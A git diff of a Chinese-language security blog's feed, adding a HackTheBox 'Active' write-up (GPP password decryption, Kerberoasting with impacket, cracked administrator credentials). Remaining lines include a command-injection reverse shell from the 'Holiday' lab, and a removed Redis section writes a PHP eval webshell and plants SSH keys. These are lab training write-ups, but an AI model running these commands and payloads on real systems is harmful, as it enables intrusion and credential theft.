@@ -1,4 +1,207 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-18T21:00:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Brainfuck</title><link href="http://localhost:4000/hack-the-box/brainfuck/" rel="alternate" type="text/html" title="HackTheBox - Brainfuck" /><published>2023-08-14T00:00:00+08:00</published><updated>2023-08-14T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/brainfuck</id><content type="html" xml:base="http://localhost:4000/hack-the-box/brainfuck/"><![CDATA[<h1 id="hackthebox---brainfuck">HackTheBox - Brainfuck</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-23T19:01:48+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Active</title><link href="http://localhost:4000/hack-the-box/Active/" rel="alternate" type="text/html" title="HackTheBox - Active" /><published>2023-08-23T00:00:00+08:00</published><updated>2023-08-23T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/Active</id><content type="html" xml:base="http://localhost:4000/hack-the-box/Active/"><![CDATA[<h1 id="hackthebox---active">HackTheBox - Active</h1>
+<h2 id="about-active">About Active</h2>
+<p>Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.</p>
+
+<h2 id="nmap">Nmap</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.93 scan initiated Mon Aug 14 07:08:47 2023 as: nmap -n -v -sC -sS -sV --min-rate=1500 -oN nmap.txt 10.10.10.100
+Increasing send delay for 10.10.10.100 from 0 to 5 due to 354 out of 1179 dropped probes since last increase.
+Increasing send delay for 10.10.10.100 from 5 to 10 due to 28 out of 91 dropped probes since last increase.
+Nmap scan report for 10.10.10.100
+Host is up (0.36s latency).
+Not shown: 981 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-14 11:08:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49176/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2023-08-14T11:10:00
+|_  start_date: 2023-08-14T11:02:37
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Aug 14 07:10:21 2023 -- 1 IP address (1 host up) scanned in 93.61 seconds
+</code></pre></div></div>
+<p>首先用nmap扫一下端口，不难看出这是一台装有域环境的靶机，域名是<code class="language-plaintext highlighter-rouge">active.htb</code>，系统是<code class="language-plaintext highlighter-rouge">Windows Server 2008 R2 SP1</code>，主机名是<code class="language-plaintext highlighter-rouge">DC</code></p>
+<h2 id="smb-enumeration">Smb Enumeration</h2>
+<p>因为139和445端口的开放，我们可以先来一个smbmap扫描                           <br />
+<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100</code>
+<img src="/images/hackthebox/active/0.png" alt="" /></p>
+
+<p>可以看到Replication在不添加用户名和密码的情况下是可读的，再加一个<code class="language-plaintext highlighter-rouge">-R</code>命令把它展开看看                       <br />
+<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100 -R Replication</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Active]
+└─$ smbmap -H 10.10.10.100 -R Replication              
+[+] IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Replication                                             READ ONLY
+        .\Replication\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
+        .\Replication\active.htb\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
+        .\Replication\active.htb\DfsrPrivate\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
+        .\Replication\active.htb\Policies\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        fr--r--r--              119 Sat Jul 21 06:38:11 2018    GPE.INI
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Preferences
+        fr--r--r--             2788 Sat Jul 21 06:38:11 2018    Registry.pol
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Groups
+        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        fr--r--r--               22 Sat Jul 21 06:38:11 2018    GPT.INI
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
+        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
+        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
+
+</code></pre></div></div>
+<p>根据得到的结果我们可以推断出来这个Replication正是SYSVOL的拷贝。可见还有文件夹没有展开，那是因为默认的深度是5，那么我可以手动设置一个深度来进一步挖掘有用的信息     <br />
+<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100 -R Replication --depth 7</code></p>
+
+<p>当深度设置为7时，发现了Groups.xml</p>
+
+<p><img src="/images/hackthebox/active/1.png" alt="" /></p>
+
+<h2 id="gpp-attack">GPP Attack</h2>
+<p>关于Groups.xml的作用和来历在下面这篇文章里有很好的解释:</p>
+
+<ul>
+  <li><a href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li>
+</ul>
+
+<p>然后用<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100 -R Replication --depth 7 -A Groups.xml -q</code>把 Groups.xml下载到本地</p>
+
+<p><img src="/images/hackthebox/active/2.png" alt="" /></p>
+
+<p>或者用smbclient把整个Replication下载下来</p>
+
+<p><img src="/images/hackthebox/active/3.png" alt="" /></p>
+
+<p>打开Groups.xml文件可以看到一个用户名<code class="language-plaintext highlighter-rouge">SVC_TGS</code>和一段cpassword，我们可以直接用kali自带工具gpp-decrypt解密这段密码，得到了明文密码：<code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>
+
+<p><img src="/images/hackthebox/active/4.png" alt="" /></p>
+
+<p>原理大概是微软在Windows Server 2008引进了一种新功能叫做GPP(Group Policy Preferences)，主要是管理员用来管理用户和组的。再设置组策略首选项时，系统会在SYSVOL文件夹生成一个Groups.xml文件，里面可能存有用户的账号和密码。安全起见，这里面的密码会被AES-256加密。但是，微软在2012年在MSDN上公布了这个AES秘钥，以至于用GPP来设置密码非常容易被破解</p>
+
+<h2 id="user-flag">User Flag</h2>
+<p>把得到的凭证<code class="language-plaintext highlighter-rouge">SVC_TGS:GPPstillStandingStrong2k18</code>添加进smbmap再扫描一下可以发现权限已然不同</p>
+
+<p><img src="/images/hackthebox/active/5.png" alt="" /></p>
+
+<p>在User共享目录下可以轻松地找到user.txt</p>
+
+<p><img src="/images/hackthebox/active/6.png" alt="" /></p>
+
+<p><img src="/images/hackthebox/active/7.png" alt="" /></p>
+
+<h2 id="kerberoasting">Kerberoasting</h2>
+
+<p>Kerberoasting攻击简单来说就是首先我们要有一个域用户，然后让其向KDC（Key Distribution Center）发送一个TGS_REQ请求，我们可以在TGS_REP返回的票据中尝试暴力破解服务运行时的任何用户的密码</p>
+
+<p>具体的攻击原理可以参考：</p>
+<ul>
+  <li><a href="https://room362.com/post/2016/kerberoast-pt1/">Kerberoasting - Part 1</a></li>
+  <li><a href="https://room362.com/post/2016/kerberoast-pt2/">Kerberoasting - Part 2</a></li>
+  <li><a href="https://room362.com/post/2016/kerberoast-pt3/">Kerberoasting - Part 3</a></li>
+</ul>
+
+<p>Kerberos验证过程：
+<img src="/images/hackthebox/active/8.png" alt="" /></p>
+
+<p>获取域内所有用户的用户名:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-GetADUsers <span class="nt">-all</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre></div></div>
+<p><img src="/images/hackthebox/active/9.png" alt="" /></p>
+
+<p>获取管理员的Kerberos票据：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-GetUserSPNs <span class="nt">-request</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre></div></div>
+<p><img src="/images/hackthebox/active/10.png" alt="" /></p>
+
+<p>可以加一个参数<code class="language-plaintext highlighter-rouge">-outputfile</code>，让hash值储存到文件中，方便下一步破解</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-GetUserSPNs <span class="nt">-request</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-outputfile</span> tic.txt
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john tic.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p><img src="/images/hackthebox/active/11.png" alt="" /></p>
+
+<h2 id="root-flag">Root Flag</h2>
+
+<p><code class="language-plaintext highlighter-rouge">Administrator:Ticketmaster1968</code></p>
+
+<p><img src="/images/hackthebox/active/12.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="windows" /><category term="active-directory" /><category term="smb" /><summary type="html"><![CDATA[HackTheBox - Active About Active Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.]]></summary></entry><entry><title type="html">HackTheBox - Brainfuck</title><link href="http://localhost:4000/hack-the-box/brainfuck/" rel="alternate" type="text/html" title="HackTheBox - Brainfuck" /><published>2023-08-14T00:00:00+08:00</published><updated>2023-08-14T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/brainfuck</id><content type="html" xml:base="http://localhost:4000/hack-the-box/brainfuck/"><![CDATA[<h1 id="hackthebox---brainfuck">HackTheBox - Brainfuck</h1>
 <h2 id="about-brainfuck">About Brainfuck</h2>
 <p>Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.</p>
 
@@ -639,7 +842,7 @@ References:
 
 View the full module info with the info -d command.
 
-</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="msf" /><category term="samba" /><summary type="html"><![CDATA[HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.]]></summary></entry><entry><title type="html">HackTheBox - Holiday</title><link href="http://localhost:4000/hack-the-box/holiday/" rel="alternate" type="text/html" title="HackTheBox - Holiday" /><published>2023-04-18T00:00:00+08:00</published><updated>2023-04-18T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/holiday</id><content type="html" xml:base="http://localhost:4000/hack-the-box/holiday/"><![CDATA[<h1 id="hackthebox---holiday">HackTheBox - Holiday</h1>
+</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="msf" /><category term="samba" /><category term="rce" /><category term="smb" /><summary type="html"><![CDATA[HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.]]></summary></entry><entry><title type="html">HackTheBox - Holiday</title><link href="http://localhost:4000/hack-the-box/holiday/" rel="alternate" type="text/html" title="HackTheBox - Holiday" /><published>2023-04-18T00:00:00+08:00</published><updated>2023-04-18T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/holiday</id><content type="html" xml:base="http://localhost:4000/hack-the-box/holiday/"><![CDATA[<h1 id="hackthebox---holiday">HackTheBox - Holiday</h1>
 <h2 id="about-holiday">About Holiday</h2>
 <p>Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.</p>
 
@@ -875,22 +1078,22 @@ listening on [any] 2333 ...
 
 <p>并且web服务器也收到信号</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - <span class="o">[</span>18/Apr/2023 22:05:48] <span class="s2">"GET /rev HTTP/1.1"</span> 200 -
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
 </code></pre></div></div>
 <p>通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了
 <img src="/images/hackthebox/holiday/13.png" alt="" /></p>
 
 <p>访问<code class="language-plaintext highlighter-rouge">/admin/export?table=b%26bash+rev</code>执行反弹shell命令，成功得到了webshell</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\1</span>4530&gt;nc <span class="nt">-lnvp</span> 2333
-listening on <span class="o">[</span>any] 2333 ...
-connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.25] 46894
-bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1137<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
-bash: no job control <span class="k">in </span>this shell
-algernon@holiday:~/app<span class="nv">$ </span><span class="nb">whoami
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 2333
+listening on [any] 2333 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
+bash: cannot set terminal process group (1137): Inappropriate ioctl for device
+bash: no job control in this shell
+algernon@holiday:~/app$ whoami
 whoami
-</span>algernon
-algernon@holiday:~/app<span class="err">$</span>
+algernon
+algernon@holiday:~/app$
 </code></pre></div></div>
 
 <p>成功拿到第一个flag</p>
@@ -983,7 +1186,7 @@ root@holiday:/root# <span class="nb">cat </span>root.txt
 <h2 id="小结">小结</h2>
 <p>这是我pawd的第一台hackthebox靶机，看到这个界面心里难免有些激动，虽然是看walkthrough做出来的，但是也花了大概一两天的时间拿下靶机以及完成记录。就当做是一个新的开始吧！走起~</p>
 
-<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="rce" /><summary type="html"><![CDATA[HackTheBox - Holiday About Holiday Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.]]></summary></entry><entry><title type="html">CVE-2020-1938 - Ghostcat</title><link href="http://localhost:4000/vulhub/CVE-2020-1938/" rel="alternate" type="text/html" title="CVE-2020-1938 - Ghostcat" /><published>2023-04-16T00:00:00+08:00</published><updated>2023-04-16T00:00:00+08:00</updated><id>http://localhost:4000/vulhub/CVE-2020-1938</id><content type="html" xml:base="http://localhost:4000/vulhub/CVE-2020-1938/"><![CDATA[<h1 id="cve-2020-1938---ghostcat">CVE-2020-1938 - Ghostcat</h1>
+<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="rce" /><category term="privilege-escalation" /><summary type="html"><![CDATA[HackTheBox - Holiday About Holiday Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.]]></summary></entry><entry><title type="html">CVE-2020-1938 - Ghostcat</title><link href="http://localhost:4000/vulhub/CVE-2020-1938/" rel="alternate" type="text/html" title="CVE-2020-1938 - Ghostcat" /><published>2023-04-16T00:00:00+08:00</published><updated>2023-04-16T00:00:00+08:00</updated><id>http://localhost:4000/vulhub/CVE-2020-1938</id><content type="html" xml:base="http://localhost:4000/vulhub/CVE-2020-1938/"><![CDATA[<h1 id="cve-2020-1938---ghostcat">CVE-2020-1938 - Ghostcat</h1>
 <h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
 <p>Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。</p>
 
@@ -1681,7 +1884,7 @@ Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储�
 
 <p>可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell</p>
 
-<p><img src="/images/vulhub/CVE-2016-4437/5.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vulhub" /><category term="shiro" /><category term="unserialize" /><category term="web" /><summary type="html"><![CDATA[CVE-2016-4437 - Shiro反序列化 0x00 漏洞概述 Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。]]></summary></entry><entry><title type="html">MS17-010 - 永恒之蓝</title><link href="http://localhost:4000/vul/ms17-010/" rel="alternate" type="text/html" title="MS17-010 - 永恒之蓝" /><published>2022-04-20T00:00:00+08:00</published><updated>2022-04-20T00:00:00+08:00</updated><id>http://localhost:4000/vul/ms17-010</id><content type="html" xml:base="http://localhost:4000/vul/ms17-010/"><![CDATA[<h1 id="ms17-010---永恒之蓝">MS17-010 - 永恒之蓝</h1>
+<p><img src="/images/vulhub/CVE-2016-4437/5.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vulhub" /><category term="shiro" /><category term="unserialize" /><category term="web" /><category term="rce" /><summary type="html"><![CDATA[CVE-2016-4437 - Shiro反序列化 0x00 漏洞概述 Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。]]></summary></entry><entry><title type="html">MS17-010 - 永恒之蓝</title><link href="http://localhost:4000/vul/ms17-010/" rel="alternate" type="text/html" title="MS17-010 - 永恒之蓝" /><published>2022-04-20T00:00:00+08:00</published><updated>2022-04-20T00:00:00+08:00</updated><id>http://localhost:4000/vul/ms17-010</id><content type="html" xml:base="http://localhost:4000/vul/ms17-010/"><![CDATA[<h1 id="ms17-010---永恒之蓝">MS17-010 - 永恒之蓝</h1>
 <h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
 <p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
 
@@ -1758,126 +1961,4 @@ $ run
 
 </code></pre></div></div>
 
-<p><img src="/images/vul/ms17-010/3.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="windows" /><category term="smb" /><category term="msf" /><summary type="html"><![CDATA[MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。]]></summary></entry><entry><title type="html">Redis未授权访问实战</title><link href="http://localhost:4000/vul/Redis/" rel="alternate" type="text/html" title="Redis未授权访问实战" /><published>2022-04-13T00:00:00+08:00</published><updated>2022-04-13T00:00:00+08:00</updated><id>http://localhost:4000/vul/Redis</id><content type="html" xml:base="http://localhost:4000/vul/Redis/"><![CDATA[<h1 id="redis未授权访问实战">Redis未授权访问实战</h1>
-<h2 id="0x00-前言">0x00 前言</h2>
-<p>最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。</p>
-
-<h2 id="0x01-redis简介">0x01 Redis简介</h2>
-<p>简单来说，Redis是一种数据库。
-Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
-
-<p>Redis和mysql的区别：
-https://www.hzpady.com/a/2119.html</p>
-
-<h2 id="0x02-漏洞原理产生条件">0x02 漏洞原理（产生条件）</h2>
-<p>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
-没有设置密码认证，可以免密码登入redis服务。</p>
-
-<h2 id="0x03-漏洞利用">0x03 漏洞利用</h2>
-<h3 id="方法1-利用redis写webshell条件是知道web目录的绝对路径并有读写权限">方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限）</h3>
-
-<p>先下载个Redis</p>
-
-<p><img src="/images/vul/redis/0.jpg" alt="" /></p>
-
-<p>在redis官网上看到可以docker pull，那岂不乐哉。</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker search redis
-$ docker pull redis
-</code></pre></div></div>
-
-<p>只需两条命令，redis已成为我的囊中之物</p>
-
-<p><img src="/images/vul/redis/1.jpg" alt="" /></p>
-
-<p>接下来运行容器</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -d -p 6379:6379 --name redis redis
-</code></pre></div></div>
-<p>用ps命令可以看到redis已经部署到了我的6379端口了</p>
-
-<p><img src="/images/vul/redis/2.jpg" alt="" /></p>
-
-<p>刚刚学了Redis未授权访问漏洞，那我自己不会也可以被x了吧？于是我扫了一下自己，并没有发现6379端口开放，那我应该还是安全的。而且好像如果被x了，x的应该也是我的docker容器才对！</p>
-
-<p><img src="/images/vul/redis/3.jpg" alt="" /></p>
-
-<p>下一步进入容器</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec -it redis /bin/bash
-</code></pre></div></div>
-<p>在容器里用 <code class="language-plaintext highlighter-rouge">redis-cli -h xxx.xxx.xxx.xxx </code>命令来连接存在漏洞的服务器</p>
-
-<p><img src="/images/vul/redis/4.jpg" alt="" /></p>
-
-<p>连接成功后的一些常用命令：</p>
-
-<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">查看信息：info</span>
-<span class="s">删除所有数据库内容：flushall</span>
-<span class="s">刷新数据库：flushdb</span>
-<span class="s">查看所有键：KEYS *，使用select num可以查看键值数据</span>
-<span class="s">设置变量：set test "whoami"</span>
-<span class="s">设置路径等配置：config set dir [dirpath]</span>
-<span class="s">获取路径及数据配置信息：config get dir/dbfilename</span>
-<span class="s">获取所有配置信息：config get *</span>
-<span class="s">保存：save</span>
-<span class="s">查看变量名称：get [变量]</span>
-</code></pre></div></div>
-
-<p>开始写webshell了，方法是</p>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span> 
-<span class="n">config</span> <span class="k">set</span>  <span class="n">dbfilename</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span> 
-<span class="k">set</span> <span class="n">x</span> <span class="nv">"&lt;?php eval($_POST[cmd]);?&gt;"</span> 
-<span class="n">save</span>
-</code></pre></div></div>
-
-<p><strong>发现找不到网站的绝对路径</strong>，试了很多也没用，看来只能另辟蹊径了</p>
-
-<h3 id="方法2-在目标机器写入ssh公钥-然后在用私钥登录前提是开启了ssh服务即22号端口开放目标机器root权限启动redis">方法2 在目标机器写入ssh公钥 然后在用私钥登录（前提是开启了ssh服务即22号端口开放，目标机器root权限启动redis）</h3>
-
-<p><img src="/images/vul/redis/5.jpg" alt="" /></p>
-
-<p><img src="/images/vul/redis/6.jpg" alt="" /></p>
-
-<p>再把key.txt导入容器</p>
-
